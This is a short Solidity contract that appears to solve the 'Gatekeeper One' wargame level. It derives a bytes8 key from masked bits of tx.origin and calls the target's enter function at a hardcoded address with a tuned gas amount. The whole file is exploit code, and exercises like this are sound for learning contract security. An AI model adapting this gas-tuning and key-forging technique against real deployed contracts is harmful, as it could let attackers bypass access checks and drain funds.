// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SolveGatekeeperOne {
    bytes8 public key;
    event PrintmsgSender(address sender, address origin);
    address gate;

    constructor() {
        gate = address(0xB7c6b259ae66FF1b0b8e93D8b8F146b209d3D3ac);
    }

// gas 57591
    function enterGate(uint256 theGas) public {
        createKey();
        (bool success, ) = gate.call{gas: theGas}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success);
    }

    function createKey() public {
        key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    }
}
